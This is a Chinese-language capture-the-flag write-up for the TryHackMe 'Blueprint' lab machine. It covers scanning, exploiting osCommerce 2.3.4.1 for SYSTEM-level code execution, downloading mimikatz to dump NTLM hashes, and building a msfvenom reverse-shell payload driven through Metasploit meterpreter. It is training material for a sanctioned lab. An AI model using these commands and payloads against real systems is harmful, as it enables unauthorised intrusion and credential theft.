## 概述

來源: [tryhackme](https://tryhackme.com/room/blueprint)  
題目: Blueprint  
難度: easy  
靶機: `10.10.82.106`

## 攻擊過程

### hosts
方便靶機重啟或斷線後測試
```bash
┌──(kali㉿kali)-[~/tryhackme/blueprint]
└─$ cat /etc/hosts   
...
10.10.82.106    blueprint.thm
...
```


### nmap 
```bash
┌──(kali㉿kali)-[~/tryhackme/blueprint]
└─$ nmap -sV -sC -v blueprint.thm   

Discovered open port 8080/tcp on 10.10.82.106
Discovered open port 3306/tcp on 10.10.82.106
Discovered open port 135/tcp on 10.10.82.106
Discovered open port 80/tcp on 10.10.82.106
Discovered open port 443/tcp on 10.10.82.106
Discovered open port 445/tcp on 10.10.82.106
Discovered open port 139/tcp on 10.10.82.106
Discovered open port 49160/tcp on 10.10.82.106
Discovered open port 49154/tcp on 10.10.82.106
Discovered open port 49159/tcp on 10.10.82.106
Discovered open port 49153/tcp on 10.10.82.106
Discovered open port 49158/tcp on 10.10.82.106
Discovered open port 49152/tcp on 10.10.82.106

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: 404 - File or directory not found.
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2h PHP/5.6.28)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_ssl-date: TLS randomness does not represent time
|_http-title: Index of /
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-title: Index of /
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -4s, deviation: 3s, median: -6s
| smb2-time: 
|   date: 2025-11-08T07:48:54
|_  start_date: 2025-11-08T07:30:11
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:b3:a4:aa:7d:cf (unknown)
| Names:
|   BLUEPRINT<00>        Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   BLUEPRINT<20>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-11-08T07:48:58+00:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required

```

### smb
```bash
┌──(kali㉿kali)-[~/tryhackme/blueprint]
└─$ smbclient -L \\\\blueprint.thm -N  

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
        Windows         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to blueprint.thm failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

有透過 Users 撈到一些資料
但沒什麼進展
```bash
┌──(kali㉿kali)-[~/tryhackme/blueprint]
└─$ smbclient \\\\blueprint.thm\\Users -N         
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Fri Apr 12 06:36:40 2019
  ..                                 DR        0  Fri Apr 12 06:36:40 2019
  Default                           DHR        0  Tue Jul 14 15:17:20 2009
  desktop.ini                       AHS      174  Tue Jul 14 12:41:57 2009
  Public                             DR        0  Tue Jul 14 12:41:57 2009

                7863807 blocks of size 4096. 4762008 blocks available
smb: \> cd Default
smb: \Default\> dir
  .                                 DHR        0  Tue Jul 14 15:17:20 2009
  ..                                DHR        0  Tue Jul 14 15:17:20 2009
  AppData                           DHn        0  Tue Jul 14 10:37:05 2009
  Desktop                            DR        0  Tue Jul 14 10:04:25 2009
  Documents                          DR        0  Tue Jul 14 12:53:55 2009
  Downloads                          DR        0  Tue Jul 14 10:04:25 2009
  Favorites                          DR        0  Tue Jul 14 10:04:25 2009
  Links                              DR        0  Tue Jul 14 10:04:25 2009
  Music                              DR        0  Tue Jul 14 10:04:25 2009
  NTUSER.DAT                       AHSn   262144  Mon Jan 16 06:39:21 2017
  NTUSER.DAT.LOG                     AH     1024  Tue Apr 12 10:28:04 2011
  NTUSER.DAT.LOG1                    AH   197632  Fri Apr 12 06:49:06 2019
  NTUSER.DAT.LOG2                    AH        0  Tue Jul 14 10:03:40 2009
  NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TM.blf    AHS    65536  Tue Jul 14 12:34:22 2009
  NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Tue Jul 14 12:34:22 2009
  NTUSER.DAT{6cced2f1-6e01-11de-8bed-001e0bcd1824}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Tue Jul 14 12:34:22 2009
  Pictures                           DR        0  Tue Jul 14 10:04:25 2009
  Saved Games                        Dn        0  Tue Jul 14 10:04:25 2009
  Videos                             DR        0  Tue Jul 14 10:04:25 2009

                7863807 blocks of size 4096. 4762008 blocks available
```

## initial acces - osCommerce 2.3.4.1 - Remote Code Execution

感謝[大神](https://diecknet.de/en/2024/09/24/tryhackme-blueprint/)分享 

### searchsploit
確認版本漏洞
```bash
┌──(kali㉿kali)-[~/tryhackme/blueprint]
└─$ searchsploit oscommerce 2.3.4        
--------------------------------------------------------- ---------------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ---------------------------------
osCommerce 2.3.4 - Multiple Vulnerabilities              | php/webapps/34582.txt
osCommerce 2.3.4.1 - 'currency' SQL Injection            | php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection         | php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection          | php/webapps/46330.txt
osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scrip | php/webapps/49103.txt
osCommerce 2.3.4.1 - Arbitrary File Upload               | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution               | php/webapps/44374.py
osCommerce 2.3.4.1 - Remote Code Execution (2)           | php/webapps/50128.py
--------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

利用 `php/webapps/50128.py`  或參考 [exploit.py](../CVE-2018-25114/exploit.py)
確認該 POC 路徑
```bash                   
┌──(kali㉿kali)-[~/tryhackme/blueprint]
└─$ searchsploit 50128 -p        
  Exploit: osCommerce 2.3.4.1 - Remote Code Execution (2)
      URL: https://www.exploit-db.com/exploits/50128
     Path: /usr/share/exploitdb/exploits/php/webapps/50128.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied EDB-ID #50128's path to the clipboard
```
> 為什麼要加 DIR_FS_DOCUMENT_ROOT 可參考 [說明](../CVE-2018-25114/README.md)  
> 為什麼用 pssthru 可參考 [說明](../php-passthru/README.md)

#### get system user
使用 POC  
發現取得 system 權限
```bash          
┌──(kali㉿kali)-[~/tryhackme/blueprint]
└─$ python3 /usr/share/exploitdb/exploits/php/webapps/50128.py http://blueprint.thm:8080/oscommerce-2.3.4/catalog
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system

RCE_SHELL$ whoami
nt authority\system
```

可以發現 `\install\includes` 多了 configure.php
POC 中改的 passthru 成功執行
```bash
RCE_SHELL$ dir
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes

11/09/2025  01:56 AM    <DIR>          .
11/09/2025  01:56 AM    <DIR>          ..
04/11/2019  09:52 PM               447 application.php
11/09/2025  01:56 AM             1,118 configure.php
04/11/2019  09:52 PM    <DIR>          functions
               2 File(s)          1,565 bytes
               3 Dir(s)  19,505,577,984 bytes free

RCE_SHELL$ more configure.php
<?php
  define('HTTP_SERVER', '://');
  define('HTTPS_SERVER', '://');
  define('ENABLE_SSL', false);
  define('HTTP_COOKIE_DOMAIN', '');
  define('HTTPS_COOKIE_DOMAIN', '');
  define('HTTP_COOKIE_PATH', '/');
  define('HTTPS_COOKIE_PATH', '/');
  define('DIR_WS_HTTP_CATALOG', '/');
  define('DIR_WS_HTTPS_CATALOG', '/');
  define('DIR_WS_IMAGES', 'images/');
  define('DIR_WS_ICONS', DIR_WS_IMAGES . 'icons/');
  define('DIR_WS_INCLUDES', 'includes/');
  define('DIR_WS_FUNCTIONS', DIR_WS_INCLUDES . 'functions/');
  define('DIR_WS_CLASSES', DIR_WS_INCLUDES . 'classes/');
  define('DIR_WS_MODULES', DIR_WS_INCLUDES . 'modules/');
  define('DIR_WS_LANGUAGES', DIR_WS_INCLUDES . 'languages/');

  define('DIR_WS_DOWNLOAD_PUBLIC', 'pub/');
  define('DIR_FS_CATALOG', './');
  define('DIR_FS_DOWNLOAD', DIR_FS_CATALOG . 'download/');
  define('DIR_FS_DOWNLOAD_PUBLIC', DIR_FS_CATALOG . 'pub/');

  define('DB_SERVER', '');
  define('DB_SERVER_USERNAME', '');
  define('DB_SERVER_PASSWORD', '');
  define('DB_DATABASE', '');passthru('more configure.php');/*');
  define('USE_PCONNECT', 'false');
  define('STORE_SESSIONS', 'mysql');
?>
```

#### get root.txt
```bash
RCE_SHELL$ dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\Users\Administrator\Desktop

11/27/2019  06:15 PM    <DIR>          .
11/27/2019  06:15 PM    <DIR>          ..
11/27/2019  06:15 PM                37 root.txt.txt
               1 File(s)             37 bytes
               2 Dir(s)  19,505,577,984 bytes free

RCE_SHELL$ more C:\Users\Administrator\Desktop\root.txt.txt
THM{...}
```

### mimikatz

本機取得 [mimikatz.exe](https://github.com/ParrotSec/mimikatz/tree/master/Win32)  
開啟 http.server
```bash
┌──(kali㉿kali)-[~/tools]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.87.118 - - [09/Nov/2025 10:08:50] "GET /mimikatz.exe HTTP/1.1" 200 -
```

靶機下載 mimikatz.exe 檔案
```bash
RCE_SHELL$ powershell (New-Object System.Net.WebClient).DownloadFile(\"http://10.4.11.38:1234/mimikatz.exe\", \"mimikatz.exe\")
<br />
<b>Fatal error</b>:  Maximum execution time of 30 seconds exceeded in <b>C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes\configure.php</b> on line <b>30</b><br />
```

雖然下載過程有顯示 error
但看檔案容量是正確的就不管了
```bash
RCE_SHELL$ dir
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes

11/09/2025  02:08 AM    <DIR>          .
11/09/2025  02:08 AM    <DIR>          ..
04/11/2019  09:52 PM               447 application.php
11/09/2025  02:08 AM             1,118 configure.php
04/11/2019  09:52 PM    <DIR>          functions
11/09/2025  02:08 AM           995,080 mimikatz.exe
               3 File(s)        996,645 bytes
               3 Dir(s)  19,508,334,592 bytes free

```

#### get ntlm
執行 mimikatz  
成功取得 ntlm
```bash
RCE_SHELL$ mimikatz "lsadump::sam" exit

  .#####.   mimikatz 2.2.0 (x86) #18362 Feb 29 2020 11:13:10
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::sam
Domain : BLUEPRINT
SysKey : 147a48de4a9815d2aa479598592b086f
Local SID : S-1-5-21-3130159037-241736515-3168549210

SAMKey : 3700ddba8f7165462130a4441ef47500

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 5...1

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Lab
  Hash NTLM: 3...0

mimikatz(commandline) # exit
Bye!
```
> 可用[ntlm.pw](https://ntlm.pw)解碼 

## initial access - multi/http/oscommerce_installer_unauth_code_exec
使用 metasploit
### msfconsle
```bash
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > show options

Module options (exploit/multi/http/oscommerce_installer_unauth_code_exec):

   Name     Current Setting           Required  Description
   ----     ---------------           --------  -----------
   Proxies                            no        A proxy chain of format type:host:port[,t
                                                ype:host:port][...]. Supported proxies: s
                                                apni, socks4, socks5, socks5h, http
   RHOSTS   blueprint.thm             yes       The target host(s), see https://docs.meta
                                                sploit.com/docs/using-metasploit/basics/u
                                                sing-metasploit.html
   RPORT    8080                      yes       The target port (TCP)
   SSL      false                     no        Negotiate SSL/TLS for outgoing connection
                                                s
   URI      /oscommerce-2.3.4/catalo  yes       The path to the install directory
            g/install/
   VHOST                              no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.4.11.38       yes       The listen address (an interface may be specified)
   LPORT  444              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   osCommerce 2.3.4.1

meterpreter > getuid
Server username: SYSTEM

```

成功取得 user meterpreter

### msfvenom
嘗試提權
製作一個 反射 .exe
> 要注意是 windows/meterpreter/reverse_tcp 不是 x64 
> 卡了一陣子才發現哈哈

```bash
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.4.11.38 LPORT=1234 -f exe  -o shell2.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell2.exe                 
```

透過剛剛的 meterpreter 上傳 shell.exe
```bash
msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > run
[*] Started reverse TCP handler on 10.4.11.38:444 
[*] Sending stage (40004 bytes) to 10.10.82.106
[*] Meterpreter session 3 opened (10.4.11.38:444 -> 10.10.82.106:49441) at 2025-11-08 17:03:16 +0800

meterpreter > dir
Listing: C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
==================================================================

Mode              Size             Type  Last modified                    Name
----              ----             ----  -------------                    ----
100666/rw-rw-rw-  1919850381759    fil   211641423418-10-04 14:56:45 +08  application.php
                                         00
100666/rw-rw-rw-  9500467660964    fil   239892541660-12-18 03:42:30 +08  configure.php
                                         00
040777/rwxrwxrwx  17592186048512   dir   211641423418-10-04 14:56:45 +08  functions
                                         00

meterpreter > upload shell2.exe
[*] Uploading  : /home/kali/tryhackme/blueprint/shell2.exe -> shell2.exe
[*] Uploaded -1.00 B of 72.07 KiB (-0.0%): /home/kali/tryhackme/blueprint/shell2.exe -> shell2.exe

```

先在另一個終端機開啟 windows/meterpreter/reverse_tcp 後再執行 shell.exe
```bash
meterpreter > execute -f shell2.exe
Process 9704 created.
```

另一個終端機開啟 windows/meterpreter/reverse_tcp
```bash
msf6 exploit(multi/handler) > show options

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, proces
                                        s, none)
   LHOST     10.4.11.38       yes       The listen address (an interface may be specified
                                        )
   LPORT     1234             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

```

這個要注意payload要改  
忘記改 payload 一直錯XD
```bash
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

成功取得 hashdump
```bash
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.4.11.38:1234 
[*] Sending stage (177734 bytes) to 10.10.82.106
[*] Meterpreter session 7 opened (10.4.11.38:1234 -> 10.10.82.106:49450) at 2025-11-08 17:10:04 +0800

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
Administrator:500:aa...ee:54...11:::
Guest:501:aa...ee:31...c0:::
Lab:1000:aa...ee:30...50:::
meterpreter > 
```
> 可參考 [NTLM](../NTLM/README.md) 破解 hash

取得 admin shell 拿到 root.txt
```bash
meterpreter > shell
Process 9876 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes>
C:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
THM{...}

```


## 參考
- https://github.com/AbdullahRizwan101/CTF-Writeups/blob/master/TryHackMe/Blueprint.md
- https://github.com/strange07/tryhackme/blob/master/Blueprint/blueprint.md